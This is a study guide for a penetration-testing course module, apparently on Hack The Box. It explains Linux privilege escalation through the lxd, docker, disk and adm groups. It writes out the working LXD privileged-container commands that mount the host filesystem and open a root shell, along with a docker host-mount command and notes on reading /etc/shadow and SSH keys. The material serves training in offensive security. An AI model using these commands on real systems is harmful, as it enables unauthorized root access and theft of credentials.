The four groups covered here are:

```text
Privileged Groups
       │
       ├── LXC / LXD
       ├── Docker
       ├── Disk
       └── ADM
```

---

# 1. 🧠 First Step — Check Your Groups

Before investigating privileged groups, determine what groups your current user belongs to:

For example:

```text
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

The important part is:

```text
groups=1009(devops),110(lxd)
                         │
                         └── Interesting!
```

Seeing one of these groups should immediately make you investigate its privileges.

---

# 🟣 2. LXC / LXD

## What is LXD?

**LXD** is Ubuntu's container manager and is similar to Docker.

The important security issue from the module is:

> Membership of the `lxd` group can be used to escalate privileges by creating a privileged LXD container and accessing the host filesystem.

### Attack concept

```text
User
 │
 └── Member of lxd group
          │
          ▼
      Create LXD container
          │
          ▼
     Make container privileged
          │
          ▼
      Mount host filesystem
          │
          ▼
       /mnt/root
          │
          ▼
    Host filesystem as root
```

---

# 3. 🔎 Confirm LXD Group Membership

The module uses:

```bash
id
```

Example:

```text
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

The critical observation:

```text
110(lxd)
```

means the user belongs to the `lxd` group.

🚨 **HTB instinct:**

> `lxd` group → investigate LXD privilege escalation.

---

# 4. 📦 Importing the Alpine Image

The module uses an Alpine image.

First:

```bash
unzip alpine.zip
```

The archive contains:

```text
64-bit Alpine/
    ├── alpine.tar.gz
    └── alpine.tar.gz.root
```

Then:

```bash
cd 64-bit\ Alpine/
```

---

# 5. ⚙️ LXD Initialization

The module runs:

```bash
lxd init
```

The example chooses the defaults.

It eventually produces:

```text
/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

Don't confuse this output with the entire technique failing.

The module proceeds to import the local image.

---

# 6. 📥 Import the Image

The command:

```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

creates an LXD image with the alias:

```text
alpine
```

Conceptually:

```text
alpine.tar.gz
      +
alpine.tar.gz.root
      │
      ▼
  LXD image
      │
      ▼
 alias: alpine
```

---

# 7. 🔥 Create a Privileged Container

This is the critical step:

```bash
lxc init alpine r00t -c security.privileged=true
```

The important option is:

```text
security.privileged=true
```

The module explains that this runs the container **without a UID mapping**, making:

```text
root inside container
        │
        ▼
root identity on host
```

for the purposes of the mounted host filesystem.

### Normal container

```text
Container root
      │
      ▼
Mapped/restricted identity
      │
      ✕
Host root
```

### Privileged container

```text
Container root
      │
      ▼
No UID mapping
      │
      ▼
Host root identity
```

This is why the configuration is dangerous.

---

# 8. 💿 Mount the Host Filesystem

Next:

```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

Let's understand the important parts:

```text
source=/
   │
   └── Host's root filesystem

path=/mnt/root
   │
   └── Where it appears inside container

recursive=true
   │
   └── Recursively include mounted filesystem content
```

So:

```text
HOST
 /
 ├── etc
 ├── home
 ├── root
 ├── var
 └── ...
       │
       │ mounted
       ▼
CONTAINER
 /mnt/root
 ├── etc
 ├── home
 ├── root
 ├── var
 └── ...
```

---

# 9. 🚀 Start the Container

```bash
lxc start r00t
```

Then spawn a shell:

```bash
lxc exec r00t /bin/sh
```

Inside:

```bash
id
```

The module gets:

```text
uid=0(root) gid=0(root)
```

Now the host filesystem is accessible under:

```text
/mnt/root
```

For example:

```bash
cd /mnt/root/root
```

This reaches the **host's `/root` directory**.

---

# 10. 💥 Why LXD Can Lead to Root

The complete chain:

```text
Current user
     │
     ▼
Member of lxd
     │
     ▼
Create container
     │
     ▼
security.privileged=true
     │
     ▼
Mount host /
     │
     ▼
/mnt/root
     │
     ▼
Host filesystem
     │
     ▼
Sensitive files / SSH keys
     │
     ▼
Potential root access
```

The module specifically mentions accessing:

```text
/etc/shadow
```

to obtain password hashes, or accessing SSH keys that may allow authentication to the host as root.

---

# 🐳 11. Docker Group

The next privileged group is:

```text
docker
```

The module makes a very important statement:

> **Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password.**

Why?

Docker allows members of the group to spawn containers.

---

# 12. 🔥 Docker Filesystem Mounting

The module's example:

```bash
docker run -v /root:/mnt -it ubuntu
```

The important option is:

```text
-v /root:/mnt
```

This mounts the host's:

```text
/root
```

into the container as:

```text
/mnt
```

Conceptually:

```text
HOST
/root
 │
 │ -v
 ▼
CONTAINER
/mnt
```

Once inside the container, the mounted directory can be accessed.

The module explains that this could allow retrieving or adding SSH keys for the root user.

---

# 13. 🐳 Docker Attack Concept

```text
User
 │
 └── docker group
        │
        ▼
   Create container
        │
        ▼
Mount host directory
        │
        ▼
Access host filesystem
        │
        ├── /root
        ├── /etc
        └── other sensitive paths
```

The module also notes that mounting `/etc` could allow access to:

```text
/etc/shadow
```

for offline password cracking, or potentially adding a privileged user.

---

# 14. 💽 Disk Group

The next group is:

```text
disk
```

This one is **extremely powerful**.

Users in the `disk` group have access to devices under:

```text
/dev
```

For example:

```text
/dev/sda1
```

which is typically a main operating-system device.

---

# 15. 🚨 Why Disk Access Is Dangerous

Think about the relationship:

```text
disk group
     │
     ▼
Direct device access
     │
     ▼
Underlying filesystem
     │
     ▼
Potential access to entire filesystem
     │
     ▼
Root-level impact
```

The module explains that an attacker with these privileges can use:

```text
debugfs
```

to access the entire filesystem with root-level privileges.

---

# 16. 🔥 What Could Be Accessed?

The module specifically mentions possibilities such as:

```text
SSH keys
Credentials
User information
Sensitive files
Potentially modifying filesystem contents
```

So when you see:

```text
groups=...,disk
```

🚨 **Investigate immediately.**

---

# 🟢 17. ADM Group

The `adm` group is different.

Membership allows users to read logs stored in:

```text
/var/log
```

Example:

```bash
id
```

Output:

```text
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

The interesting portion is:

```text
4(adm)
```

---

# 18. 📝 Does ADM = Root?

**No.**

This distinction is very important.

The module explicitly says:

> This does not directly grant root access.

Instead, `adm` can help with **information gathering**.

```text
adm
 │
 ▼
Read /var/log
 │
 ├── Sensitive data
 ├── User actions
 ├── Application activity
 ├── Authentication information
 └── Cron-related activity
```

That information can then lead to another privilege-escalation path.

---

# 19. 🔎 Why Logs Are Valuable

Logs may reveal:

```text
Usernames
Commands/actions
Authentication attempts
Application behavior
Service activity
Cron activity
Potential credentials/secrets
```

For example:

```text
adm
 │
 ▼
/var/log
 │
 ▼
Discover user activity
 │
 ▼
Discover scheduled jobs
 │
 ▼
Understand scripts/processes
 │
 ▼
Find another weakness
```

So `adm` is primarily an **enumeration/information-gathering advantage** rather than direct root access.

---

# 🧠 20. Privileged Groups Comparison

|Group|Main capability|Potential impact|
|---|---|---|
|`lxd`|Create/manage LXD containers|🔴 Potential host root|
|`docker`|Create Docker containers and mount host paths|🔴 Essentially root-level filesystem access|
|`disk`|Access devices under `/dev`|🔴 Potential full filesystem access|
|`adm`|Read `/var/log`|🟠 Information gathering / possible credentials|

### Memorize:

```text
lxd    → Containers → Host filesystem
docker → Containers → Host filesystem
disk   → Devices    → Filesystem
adm    → Logs       → Information
```

---

# 21. 🔥 HTB Recognition Table

When you run:

```bash
id
```

and see:

### `lxd`

```text
groups=...,lxd
```

Think:

> **LXD privilege escalation**

---

### `docker`

```text
groups=...,docker
```

Think:

> **Docker → mount host filesystem**

---

### `disk`

```text
groups=...,disk
```

Think:

> **Direct device access → potentially entire filesystem**

---

### `adm`

```text
groups=...,adm
```

Think:

> **Read `/var/log` → hunt for sensitive information**

---

# 🧩 22. How This Fits Your Enumeration Methodology

This connects directly to your previous **Environment Enumeration** module.

Earlier:

```bash
id
```

was introduced primarily to identify the current user and groups.

Now you know **why the group information matters**.

```text
                id
                 │
                 ▼
              Groups
                 │
       ┌─────────┼─────────┬─────────┐
       ▼         ▼         ▼         ▼
      lxd      docker     disk       adm
       │         │         │          │
       ▼         ▼         ▼          ▼
   Container   Container  Device     Logs
       │         │         │          │
       └─────────┴─────────┘          │
                 │                    │
                 ▼                    ▼
         Host filesystem        Information
                 │                    │
                 ▼                    ▼
            Potential              Further
              ROOT                enumeration
```

---

# ⚔️ STRICT MENTOR MODE

Here's the habit I want you to build.

When you run:

**DO NOT just read the username.**

Read:

```text
uid=?
gid=?
groups=?
```

Then scan every group.

### Example:

```text
uid=1009(devops)
gid=1009(devops)
groups=1009(devops),110(lxd),4(adm)
```

Your brain should immediately say:

```text
lxd
 ↓
HIGH PRIORITY
 ↓
Investigate container privileges


adm
 ↓
Read logs
 ↓
Information gathering
```

That's **professional enumeration**, not just command memorization.

---

# 📝 CPTS MUST-KNOW

### Check group membership

### LXD

```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

```bash
lxc init alpine r00t -c security.privileged=true
```

```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

```bash
lxc start r00t
```

```bash
lxc exec r00t /bin/sh
```

### Docker example

```bash
docker run -v /root:/mnt -it ubuntu
```

### Disk

Remember:

```text
disk → /dev → debugfs → filesystem
```

### ADM

Remember:

```text
adm → /var/log
```

---

# 🔥 FINAL REVISION CARD

```text
                  `id`
                   │
                   ▼
              GROUP MEMBERSHIP
                   │
       ┌───────────┼────────────┐
       │           │            │
       ▼           ▼            ▼
      lxd        docker        disk
       │           │            │
       ▼           ▼            ▼
   Privileged   Mount host   Direct device
   container    filesystem      access
       │           │            │
       └───────────┼────────────┘
                   ▼
          Potential ROOT ACCESS


                  adm
                   │
                   ▼
               /var/log
                   │
                   ▼
          Sensitive information
                   │
                   ▼
          Further enumeration
```

### 🧠 One-line memory trick:

> **`lxd` = container root, `docker` = host filesystem, `disk` = raw device/filesystem access, `adm` = logs.**

And this is a **major CPTS connection**:

```text
id
 ↓
Groups
 ↓
Privileged group?
 ↓
Identify capability
 ↓
Investigate abuse path
 ↓
Privilege escalation
```

Don't skip `id` when you land on a box. **A username tells you who you are; group membership can tell you what you're capable of.**